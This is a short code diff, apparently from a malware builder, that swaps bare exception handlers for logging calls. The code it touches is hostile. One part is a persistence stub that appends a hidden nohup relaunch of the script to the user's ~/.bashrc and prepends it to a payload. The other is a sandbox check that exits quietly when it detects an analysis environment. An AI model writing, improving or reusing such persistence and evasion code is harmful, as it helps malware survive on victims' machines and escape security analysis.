@@ -95,7 +95,14 @@ try:
         cron_line = f"@reboot {sys.executable} {os.path.abspath(sys.argv[0])}\\n"
         with open(os.path.expanduser("~/.bashrc"), "a") as f:
             f.write(f"\\n(nohup {sys.executable} {os.path.abspath(sys.argv[0])} &) >/dev/null 2>&1\\n")
-except: pass
+except Exception as e:
+    from error_handler import get_error_handler, ErrorCategory, ErrorSeverity
+    get_error_handler().log_error(
+        e,
+        severity=ErrorSeverity.LOW,
+        category=ErrorCategory.FILE_IO,
+        context={'operation': 'persistence_setup_python'}
+    )
 """
             return persistence_stub + payload
 
@@ -125,7 +132,14 @@ def is_sandboxed():
         # Check mouse movement (simplified)
         # Check core count
         if os.cpu_count() < 2: return True
-    except: pass
+    except Exception as e:
+        from error_handler import get_error_handler, ErrorCategory, ErrorSeverity
+        get_error_handler().log_error(
+            e,
+            severity=ErrorSeverity.LOW,
+            category=ErrorCategory.SUBPROCESS,
+            context={'operation': 'sandbox_detection'}
+        )
     return False
 
 if is_sandboxed(): sys.exit(0)
